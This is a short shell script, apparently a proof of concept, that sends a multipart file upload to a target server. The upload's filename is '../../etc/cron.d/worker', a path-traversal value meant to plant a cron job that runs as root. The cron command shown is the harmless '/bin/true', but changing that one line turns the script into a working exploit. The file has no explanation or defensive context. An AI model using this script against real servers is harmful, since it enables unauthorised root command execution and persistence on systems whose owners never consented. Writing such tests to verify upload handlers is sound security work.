#!/bin/sh
curl -X POST "$1/files" -H 'Content-Type: multipart/form-data; boundary=upload' --data-binary @- <<'BODY'
--upload
Content-Disposition: form-data; name="file"; filename="../../etc/cron.d/worker"
Content-Type: application/octet-stream

* * * * * root /bin/true
--upload--
BODY
